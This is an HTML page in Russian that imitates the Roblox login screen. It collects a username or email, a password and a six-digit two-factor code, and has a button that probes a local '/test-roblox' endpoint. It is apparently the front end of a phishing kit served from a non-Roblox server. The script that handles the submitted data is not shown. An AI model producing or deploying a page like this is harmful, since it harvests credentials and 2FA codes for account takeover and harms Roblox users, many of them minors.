<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход в Roblox</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600;700&display=swap" rel="stylesheet">
</head>
<body class="rbx-body">
    <div class="container-main">
        <div class="login-form-container">
            <!-- Форма входа -->
            <form id="loginForm" class="login-form">
                <div class="form-title">Вход в Roblox</div>
                <div class="form-subtitle">Введите свои данные для входа</div>
                
                <div class="form-group">
                    <label for="username">Логин или Email</label>
                    <input type="text" id="username" name="username" class="input-field" placeholder="Введите логин или email" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Пароль</label>
                    <input type="password" id="password" name="password" class="input-field" placeholder="Введите пароль" required>
                </div>
                
                <div class="form-group remember-me-form-group">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">Запомнить меня</label>
                </div>
                
                <button type="submit" class="login-button">
                    <span class="button-text">Войти</span>
                </button>
            </form>
            
            <!-- Форма 2FA -->
            <form id="codeForm" class="code-form">
                <div class="form-title">Двухфакторная аутентификация</div>
                <div class="form-subtitle">Введите код, отправленный на ваш телефон или email</div>
                
                <div class="form-group">
                    <label for="twofaCode">Код 2FA</label>
                    <input type="text" id="twofaCode" name="twofaCode" class="input-field" placeholder="Введите код" maxlength="6" required>
                </div>
                
                <button type="submit" class="submit-2fa-button">Подтвердить</button>
                <button type="button" id="backToLogin" class="btn-secondary">← Вернуться к входу</button>
            </form>
            
            <!-- Сообщения о результате -->
            <div id="result" class="result-message"></div>
            
            <!-- Кнопка тестирования -->
            <button type="button" id="testRoblox" class="btn-secondary" style="margin-top: 20px;">Тест подключения к Roblox</button>
        </div>
    </div>
    
    <script src="js/simple.js"></script>
    
    <script>
        // Дополнительная логика для тестирования
        document.getElementById('testRoblox').addEventListener('click', async function() {
            try {
                const response = await fetch('/test-roblox');
                const data = await response.json();
                
                if (data.status === 'success') {
                    alert(`✅ ${data.message}\nСтатус: ${data.status_code}\nРазмер ответа: ${data.content_length} символов`);
                } else {
                    alert(`❌ ${data.message}`);
                }
            } catch (error) {
                alert(`❌ Ошибка тестирования: ${error.message}`);
            }
        });
    </script>
</body>
</html>
